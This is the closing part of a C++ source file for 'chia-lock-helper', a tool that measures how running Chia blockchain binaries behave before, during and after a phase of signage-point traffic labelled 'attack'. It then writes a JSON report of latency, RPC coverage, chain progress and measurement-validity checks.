    result["peak_after"] = peakAfter;
    result["start_late_ms"] = startLateMs;
    result["warnings"] = warnings;
    result["log_error"] = stat(args.need("log").c_str(), &after) != 0 ||
        before.st_ino != after.st_ino || after.st_size < before.st_size;
    if (pressureDuration > 0) {
        auto pressure = scanLog(args.need("log"), start, pressureEnd);
        pressure["phase"] = "attack_pressure";
        pressure["start_at_ns"] = start;
        pressure["duration_seconds"] = pressureDuration;
        pressure["heartbeat"] = summarize(pressureProbes);
        pressure["heartbeat_failures"] = pressureFailures;
        pressure["heartbeat_skipped"] = pressureSkipped;
        pressure["heartbeat_scheduled"] =
            pressureProbes.size() + pressureFailures + pressureSkipped;
        pressure["heartbeat_samples_ms"] = pressureProbes;
        pressure["warnings"] = Json::array();
        pressure["log_error"] = result["log_error"];
        result["pressure_window"] = pressure;
    }
    save(args.need("output"), result);
}

std::optional<double> p95(const Json& document, const std::string& metric) {
    if (!document.contains(metric) || !document.at(metric).contains("p95_ms") ||
        document.at(metric).at("p95_ms").is_null()) return std::nullopt;
    return document.at(metric).at("p95_ms").get<double>();
}

std::optional<long long> heightDelta(const Json& document) {
    const auto& before = document.at("peak_before");
    const auto& after = document.at("peak_after");
    if (before.is_null() || after.is_null()) return std::nullopt;
    const auto delta = after.at("height").get<long long>() - before.at("height").get<long long>();
    if (delta < 0) return std::nullopt;
    return delta;
}

std::optional<double> heightRate(const Json& document) {
    const auto delta = heightDelta(document);
    if (!delta || document.at("duration_seconds").get<double>() <= 0) return std::nullopt;
    return *delta / document.at("duration_seconds").get<double>();
}

Json metricChange(const Json& control, const Json& observed, const std::string& metric) {
    Json result = {
        {"control", control.at(metric)},
        {"observed", observed.at(metric)},
        {"p95_delta_ms", nullptr},
        {"p95_ratio", nullptr},
    };
    const auto controlP95 = p95(control, metric);
    const auto observedP95 = p95(observed, metric);
    if (controlP95 && observedP95) {
        result["p95_delta_ms"] = *observedP95 - *controlP95;
        if (*controlP95 != 0) result["p95_ratio"] = *observedP95 / *controlP95;
    }
    return result;
}

Json farmerActivity(const Json& document) {
    return {
        {"latency", document.at("farmer")},
        {"declare_count", document.at("declare_count")},
        {"request_signed_values_count", document.at("request_signed_values_count")},
        {"pending_declarations", document.at("pending_declarations")},
        {"unmatched_signed_values", document.at("unmatched_signed_values")},
    };
}

Json rpcActivity(const Json& document) {
    return {
        {"latency", document.at("heartbeat")},
        {"successful", document.at("heartbeat").at("count")},
        {"failed", document.at("heartbeat_failures")},
        {"skipped", document.at("heartbeat_skipped")},
        {"scheduled", document.at("heartbeat_scheduled")},
    };
}

Json phaseProgress(const Json& document) {
    Json result = {
        {"peak_before", document.at("peak_before")},
        {"peak_after", document.at("peak_after")},
        {"blocks_added", nullptr},
        {"blocks_per_second", nullptr},
    };
    const auto delta = heightDelta(document);
    if (delta) result["blocks_added"] = *delta;
    const auto rate = heightRate(document);
    if (rate) result["blocks_per_second"] = *rate;
    return result;
}

bool rpcCoverage(const Json& document, long long minimumPercent) {
    const auto scheduled = document.at("heartbeat_scheduled").get<long long>();
    const auto successful = document.at("heartbeat").at("count").get<long long>();
    return scheduled > 0 && successful * 100 >= scheduled * minimumPercent;
}

Json measurementContext(const Json& document) {
    return {
        {"phase", document.value("phase", std::string("unspecified"))},
        {"start_at_ns", document.value("start_at_ns", 0LL)},
        {"duration_seconds", document.at("duration_seconds")},
        {"start_late_ms", document.value("start_late_ms", 0.0)},
        {"timestamp_errors", document.at("timestamp_errors")},
        {"log_rotated_or_truncated", document.at("log_error")},
        {"monitor_messages", document.value("warnings", Json::array())},
    };
}

int report(const Args& args) {
    const auto control = load(args.need("control"));
    const auto loadPhase = load(args.need("attack"));
    const auto recovery = load(args.need("recovery"));
    const auto scheduledMessages = args.integer("expected-attack-messages", 0);
    const auto minControlFarmerSamples = args.integer("min-control-farmer-samples", 1);
    const auto minLoadFarmerDeclarations = args.integer("min-load-farmer-declarations", 1);
    const auto minControlBlocks = args.integer("min-control-blocks", 1);
    const auto minTrafficRatio = args.integer("min-traffic-ratio-percent", 90);
    const auto minRpcRatio = args.integer("min-rpc-ratio-percent", 90);

    require(control.value("phase", std::string()) == "control", "control measurement has wrong phase");
    require(loadPhase.value("phase", std::string()) == "attack", "load measurement has wrong phase");
    require(recovery.value("phase", std::string()) == "recovery", "recovery measurement has wrong phase");
    const Json& loadPressure = loadPhase.contains("pressure_window") ?
        loadPhase.at("pressure_window") : loadPhase;

    const auto controlBlocks = heightDelta(control);
    const auto trafficReceivedDuringLoad = loadPhase.at("incoming_signage_points").get<long long>();
    const auto trafficReceivedDuringRecovery = recovery.at("incoming_signage_points").get<long long>();
    const auto trafficReceived = trafficReceivedDuringLoad + trafficReceivedDuringRecovery;
    const bool controlFarmerValid =
        control.at("farmer").at("count").get<long long>() >= minControlFarmerSamples;
    const bool loadFarmerValid =
        loadPressure.at("declare_count").get<long long>() >= minLoadFarmerDeclarations;
    const bool controlChainValid = controlBlocks && *controlBlocks >= minControlBlocks;
    const bool trafficValid = scheduledMessages > 0 &&
        trafficReceived * 100 >= scheduledMessages * minTrafficRatio;
    const bool rpcControlValid = rpcCoverage(control, minRpcRatio);
    const bool rpcLoadValid = rpcCoverage(loadPhase, minRpcRatio);
    const bool rpcPressureValid = rpcCoverage(loadPressure, minRpcRatio);
    const bool rpcRecoveryValid = rpcCoverage(recovery, minRpcRatio);
    const bool timestampsValid = control.at("timestamp_errors").get<long long>() == 0 &&
        loadPhase.at("timestamp_errors").get<long long>() == 0 &&
        recovery.at("timestamp_errors").get<long long>() == 0;
    const bool logsValid = !control.at("log_error").get<bool>() &&
        !loadPhase.at("log_error").get<bool>() && !recovery.at("log_error").get<bool>();
    const bool valid = controlFarmerValid && loadFarmerValid && controlChainValid &&
        trafficValid && rpcControlValid && rpcLoadValid && rpcPressureValid && rpcRecoveryValid &&
        timestampsValid && logsValid;

    const auto loadIncoming = loadPhase.at("incoming_signage_points").get<long long>();
    const auto loadResults = loadPhase.at("signage_results").get<long long>();
    const auto estimatedPendingAtRecovery = std::max(0LL, loadIncoming - loadResults);

    Json result = {
        {"format", 5},
        {"purpose", "Behavior-only black-box observations from the running Chia binaries. No original/optimized classification or performance verdict is produced."},
        {"build", {
            {"version", args.get("build-version", "unknown")},
            {"package_sha256", args.get("package-sha256", "unknown")},
            {"implementation_sha256", args.get("build-fingerprint", "unknown")},
        }},
        {"measurement_validity", {
            {"passed", valid},
            {"meaning", "These checks verify that the intended live workload and observations occurred. They do not judge whether the implementation is original, modified, secure, or performant."},
            {"checks", {
                {"control_farmer_samples", {
                    {"passed", controlFarmerValid},
                    {"minimum", minControlFarmerSamples},
                    {"observed", control.at("farmer").at("count")},
                }},
                {"load_farmer_declarations", {
                    {"passed", loadFarmerValid},
                    {"minimum", minLoadFarmerDeclarations},
                    {"observed", loadPressure.at("declare_count")},
                    {"window_seconds", loadPressure.at("duration_seconds")},
                }},
                {"control_chain_progress", {
                    {"passed", controlChainValid},
                    {"minimum_blocks", minControlBlocks},
                    {"observed_blocks", controlBlocks ? Json(*controlBlocks) : Json(nullptr)},
                }},
                {"load_traffic_received", {
                    {"passed", trafficValid},
                    {"minimum_percent", minTrafficRatio},
                    {"scheduled", scheduledMessages},
                    {"observed_total", trafficReceived},
                    {"observed_during_load", trafficReceivedDuringLoad},
                    {"observed_during_recovery", trafficReceivedDuringRecovery},
                }},
                {"rpc_probe_coverage", {
                    {"passed", rpcControlValid && rpcLoadValid && rpcPressureValid && rpcRecoveryValid},
                    {"minimum_percent", minRpcRatio},
                    {"control", rpcControlValid},
                    {"load_pressure", rpcPressureValid},
                    {"load", rpcLoadValid},
                    {"recovery", rpcRecoveryValid},
                }},
                {"log_measurement_integrity", {
                    {"passed", timestampsValid && logsValid},
                    {"timestamps_valid", timestampsValid},
                    {"logs_not_rotated_or_truncated", logsValid},
                }},
            }},
        }},
        {"tests", {
            {"farmer_protocol_activity", {
                {"description", "Observe actual declare_proof_of_space to request_signed_values activity before, during, and after signage-point traffic."},
                {"control", farmerActivity(control)},
                {"load_pressure", farmerActivity(loadPressure)},
                {"load", farmerActivity(loadPhase)},
                {"recovery", farmerActivity(recovery)},
                {"load_change_from_control", metricChange(control, loadPhase, "farmer")},
                {"recovery_change_from_control", metricChange(control, recovery, "farmer")},
            }},
            {"full_node_rpc_activity", {
                {"description", "Observe actual full-node healthz responses before, during, and after signage-point traffic."},
                {"control", rpcActivity(control)},
                {"load_pressure", rpcActivity(loadPressure)},
                {"load", rpcActivity(loadPhase)},
                {"recovery", rpcActivity(recovery)},
                {"load_change_from_control", metricChange(control, loadPhase, "heartbeat")},
                {"recovery_change_from_control", metricChange(control, recovery, "heartbeat")},
            }},
            {"signage_processing_and_recovery", {
                {"description", "Observe actual signage-point receipt/result logging and chain movement during load and after senders stop."},
                {"scheduled_messages", scheduledMessages},
                {"load_pressure", {
                    {"incoming_signage_points", loadPressure.at("incoming_signage_points")},
                    {"signage_results", loadPressure.at("signage_results")},
                    {"backlog", loadPressure.at("signage_backlog")},
                    {"invalid_vdf_bans", loadPressure.at("invalid_vdf_bans")},
                    {"duration_seconds", loadPressure.at("duration_seconds")},
                }},
                {"load", {
                    {"incoming_signage_points", loadPhase.at("incoming_signage_points")},
                    {"signage_results", loadPhase.at("signage_results")},
                    {"backlog", loadPhase.at("signage_backlog")},
                    {"invalid_vdf_bans", loadPhase.at("invalid_vdf_bans")},
                    {"chain_progress", phaseProgress(loadPhase)},
                }},
                {"recovery", {
                    {"incoming_signage_points", recovery.at("incoming_signage_points")},
                    {"signage_results", recovery.at("signage_results")},
                    {"backlog", recovery.at("signage_backlog")},
                    {"invalid_vdf_bans", recovery.at("invalid_vdf_bans")},
                    {"chain_progress", phaseProgress(recovery)},
                }},
                {"estimated_pending_when_recovery_started", estimatedPendingAtRecovery},
                {"control_chain_progress", phaseProgress(control)},
            }},
        }},
        {"measurement_context", {
            {"control", measurementContext(control)},
            {"load_pressure", measurementContext(loadPressure)},
            {"load", measurementContext(loadPhase)},
            {"recovery", measurementContext(recovery)},
        }},
        {"workload", {
            {"fixture_sha256", args.get("fixture-sha256", "unknown")},
            {"scheduled_messages", scheduledMessages},
            {"sut_logged_messages_during_load", loadPhase.at("incoming_signage_points")},
            {"sut_logged_messages_during_recovery", recovery.at("incoming_signage_points")},
            {"sut_logged_results_during_load", loadPhase.at("signage_results")},
            {"sut_logged_results_during_recovery", recovery.at("signage_results")},
        }},
        {"measurements", {
            {"control", control},
            {"load", loadPhase},
            {"recovery", recovery},
        }},
    };
    save(args.need("output"), result);
    return valid ? 0 : 2;
}
} // namespace

int main(int argc, char** argv) {
    try {
        if (argc < 2 || std::string(argv[1]) == "--help") {
            std::cout << "Usage: chia-lock-helper config|make-fixtures|send-set|monitor|report --option value ...\n";
            return 0;
        }
        const std::string command = argv[1];
        Args args(argc, argv);
        if (command == "config") config(args);
        else if (command == "make-fixtures") fixtures(args);
        else if (command == "send-set") sendSet(args);
        else if (command == "monitor") monitor(args);
        else if (command == "report") return report(args);
        else throw std::runtime_error("unknown command: " + command);
        return 0;
    } catch (const std::exception& exception) {
        std::cerr << "lock-helper: " << exception.what() << '\n';
        return 1;
    }
}
